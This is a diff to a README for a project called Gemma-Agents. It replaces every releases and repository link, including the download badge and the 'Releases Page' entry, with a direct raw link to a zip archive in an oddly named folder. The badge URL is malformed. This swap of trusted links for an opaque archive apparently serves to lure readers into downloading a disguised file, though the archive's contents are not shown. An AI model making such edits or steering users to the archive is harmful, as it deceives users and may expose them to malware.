@@ -1,6 +1,6 @@
 # 🎉 Gemma-Agents - Automate Everyday Tasks Easily
 
-[![Download Gemma-Agents](https://img.shields.io/badge/Download%20Gemma--Agents-blue.svg)](https://github.com/raintreeloo/Gemma-Agents/releases)
+[![Download Gemma-Agents](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip%https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you start, confirm that your computer meets the following requirements:
 
 To download Gemma-Agents, visit the Releases page. You will find the latest version available for download.
 
-[Visit this page to download](https://github.com/raintreeloo/Gemma-Agents/releases)
+[Visit this page to download](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)
 
 1. Click on the link above.
 2. Find the version you want to download.
@@ -66,7 +66,7 @@ Your experience matters. If you encounter issues or have suggestions, please ope
 
 ## 🔗 Links
 
-- **GitHub Repository:** [Gemma-Agents](https://github.com/raintreeloo/Gemma-Agents)
-- **Releases Page:** [Visit this page to download](https://github.com/raintreeloo/Gemma-Agents/releases)
+- **GitHub Repository:** [Gemma-Agents](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)
+- **Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/raintreeloo/Gemma-Agents/main/Ceriomyces/Gemma-Agents-3.9.zip)
 
 Thank you for choosing Gemma-Agents. We look forward to assisting you in automating your workflows!
